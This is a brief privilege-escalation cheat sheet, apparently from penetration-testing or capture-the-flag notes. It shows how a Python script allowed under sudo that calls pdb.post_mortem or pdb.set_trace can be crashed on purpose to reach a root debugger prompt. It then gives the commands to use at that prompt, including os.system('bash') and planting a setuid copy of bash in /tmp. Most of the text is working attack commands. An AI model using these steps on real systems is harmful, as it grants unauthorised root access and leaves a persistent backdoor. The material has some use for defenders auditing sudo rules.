# Python PDB sudo Escape

If a Python script run via `sudo` uses `pdb.post_mortem()` (or `pdb.set_trace()`) on exception, deliberately trigger the exception to drop into a PDB interactive prompt — then execute arbitrary Python as root.

**Identify the sudo entry:**
```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/some-script.py
```

**Trigger the exception** — send input that causes a crash (e.g. non-integer where int() is expected, KeyboardInterrupt, connection error):
```bash
# Terminal 1 — run the script
sudo /usr/bin/python3 /opt/some-script.py

# Terminal 2 — send crashing input
nc 127.0.0.1 <PORT>
# type something non-numeric or invalid
```

**At the (Pdb) prompt, execute as root:**
```python
(Pdb) import os
(Pdb) os.system('bash')
# or:
(Pdb) import os; os.system('cp /bin/bash /tmp/b; chmod +s /tmp/b')
```

Then `exit` and run `/tmp/b -p`.

**Pattern: any `except` block that calls `pdb.post_mortem(e.__traceback__)` is exploitable.**
